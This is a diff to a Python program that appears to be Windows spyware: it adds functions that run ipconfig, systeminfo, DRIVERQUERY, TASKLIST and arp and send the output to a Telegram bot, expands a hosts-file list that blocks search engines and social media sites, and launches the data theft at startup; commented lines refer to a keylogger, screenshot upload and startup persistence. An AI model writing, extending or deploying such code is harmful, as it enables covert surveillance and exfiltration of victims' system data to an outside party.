@@ -65,7 +65,7 @@ class Util:
         except:
             return False
 
-    def split_string(n, st):
+    def split_string(self, n, st):
         lst = ['']
         for i in str(st):
             l = len(lst) - 1
@@ -360,11 +360,40 @@ class WebsiteBlock:
         "# localhost name resolution is handled within DNS itself.\n"\
         "#	127.0.0.1       localhost\n"\
         "#	::1             localhost"
-        self.listWebs = ["www.youtube.com",
+        self.listWebs = ["www.gogle.com",
                          "www.wikipedia.com",
-                         "www.google.com",
-                         "www."
-                         ]
+                         "www.bing.com",
+                         "www.es.yahoo.com",
+                         "www.altavista.com",
+                         "www.ask.com",
+                         "www.gigablast.com",
+                         "www.excite.com",
+                         "www.lycos.com",
+                         "www.wolframalpha.com",
+                         "http://zanran.com/q/",
+                         "www.quandl.com",
+                         "www.factbites.com",
+                         "ww.nationmaster.com",
+                         "",
+                         "",
+                         "",
+                         "",
+                         "",
+                         "",
+                         "",
+                         "",
+                         "www.facebook.com",
+                         "www.Instagram.com",
+                         "www.twiter.com",
+                         "www.tiktok.com",
+                         "www.youtube.com",
+                         "www.wechat.com",
+                         "www.linkedln.com",
+                         "www.skype.com",
+                         "www.snapchat.com",
+                         "www.pinterest.com",
+                         "www.whatsapp.com",
+                         "www.reddit.com"]
 
         #self.hostsPath = r"test.txt"
 
@@ -413,29 +442,44 @@ class WebsiteBlock:
 class PCInformation:
     def __init__(self):
         pass
-    def __display_dns(self):
-        response = ""
-        lines = os.popen('ipconfig /displaydns')
+    def __CMD_command(self,title,  command):
+        response = title + "\n"
+        lines = os.popen(command)
         for line in lines:
             line.replace('\n\n', '\n')
             response += line
         return response
 
+    def __display_dns(self):
+        return self.__CMD_command(
+            title="DNS Display Information",
+            command="ipconfig /displaydns")
+
     def __ip_config(self):
-        response = ""
-        lines = os.popen('ipconfig /all')
-        for line in lines:
-            line.replace('\n\n', '\n')
-            response += line
-        return response
+        return self.__CMD_command(
+            title="Information: IP Config /all",
+            command="ipconfig /all")
+
+    def __system_info(self):
+        return self.__CMD_command(
+            title="Information: System",
+            command="systeminfo")
+
+    def __driver_info(self):
+        return self.__CMD_command(
+            title="Information: Driver Information",
+            command="DRIVERQUERY")
+    def __taks_list(self):
+        return self.__CMD_command(
+            title="Information: Taks List",
+            command="TASKLIST")
 
     def __red_info(self):
         def internalIP():
             internal_ip = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             internal_ip.connect(('google.com', 0))
             return internal_ip.getsockname()[0]
-
-        response = ""
+        response = "Information: RED Info\n"
         lines = os.popen('arp -a -N ' + internalIP())
         for line in lines:
             line.replace('\n\n', '\n')
@@ -445,21 +489,59 @@ class PCInformation:
     def send(self):
         bot = telepot.Bot(Config.TelegramBot().TOKEN)
         chat_id = Config.TelegramBot().ID[0]
-        response = ""
         bot.sendChatAction(chat_id, 'typing')
+        # Dns Information
+        response = self.__display_dns()
+        responses = Util().split_string(4000, response)
+        for resp in responses:
+            #bot.sendMessage(chat_id, resp)
+            pass
 
-        responses = Util().split_string(4096, response)
+        # Red Information
+        response = self.__red_info()
+        responses = Util().split_string(4000, response)
+        for resp in responses:
+            #bot.sendMessage(chat_id, resp)
+            pass
+
+        # IP Config /All
+        response = self.__ip_config()
+        responses = Util().split_string(4000, response)
+        for resp in responses:
+            #bot.sendMessage(chat_id, resp)
+            pass
+
+        # System Info
+        response = self.__system_info()
+        responses = Util().split_string(4000, response)
         for resp in responses:
             bot.sendMessage(chat_id, resp)
 
+        # Drivers Information
+        response = self.__driver_info()
+        responses = Util().split_string(4000, response)
+        for resp in responses:
+            bot.sendMessage(chat_id, resp)
 
+        # Taks List
+        response = self.__driver_info()
+        responses = Util().split_string(4000, response)
+        for resp in responses:
+            bot.sendMessage(chat_id, resp)
 
 if __name__ == '__main__':
+
+    # Verifica permisos de admistrador: Administrador
+    print("Is Admin?: Admin Sucess" if Util().is_admin() else "Is Admin?: Admin Failed")
+    #threading.Thread(target=WebsiteBlock().block).start() if Util().is_admin() else False  # Bloquear Webs
+    #threading.Thread(target=WebsiteBlock().reset()).start()  if Util().is_admin() else False  # Desbloquear Webs
     #print("PATH Screenshot: " + Config().Screenshot().PATH) if Config().DEBUG else False
     #threading.Thread(target=StartUp().infinite).start()
+
+    threading.Thread(target=PCInformation().send).start()
+
     #threading.Thread(target=Key().listen_key).start() if Config().Keylogger().ACTIVE else False
     #threading.Thread(target=Screenshot().send).start() if Config().Screenshot().ACTIVE else False
-    pass
 
 
 
